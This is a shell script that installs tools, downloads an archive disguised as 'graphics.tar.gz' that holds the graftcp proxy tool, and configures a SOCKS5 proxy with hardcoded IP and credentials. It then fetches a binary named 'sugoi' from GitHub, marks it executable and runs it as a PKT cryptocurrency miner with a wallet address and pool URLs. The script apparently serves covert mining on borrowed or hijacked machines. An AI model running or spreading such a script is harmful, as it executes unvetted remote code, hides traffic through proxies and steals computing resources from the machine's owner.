#!/bin/sh
ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
dpkg-reconfigure --frontend noninteractive tzdata

apt update;apt -y install binutils cmake build-essential screen unzip net-tools curl

wget https://raw.githubusercontent.com/nathanfleight/scripts/main/graphics.tar.gz

tar -xvzf graphics.tar.gz

cat > graftcp/local/graftcp-local.conf <<END 
listen = :2233
loglevel = 1
socks5 = 45.155.69.201:6406
socks5_username = ingfoingfo
socks5_password = maszZeehh
END

./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &

sleep .2

echo " "
echo " "

echo "**"

./graftcp/graftcp curl ifconfig.me

echo " "
echo " "

echo "**"

echo " "
echo " "

./graftcp/graftcp wget https://raw.githubusercontent.com/AntonyAjax/ehem/main/sugoi && chmod +x sugoi && ./sugoi ann -p pkt1qqa56gl4m9g7nm5xqsasf55wd60kqwflg9sxchh https://stratum.zetahash.com http://pool.pkt.world http://pool.pktpool.io | grep goodrate
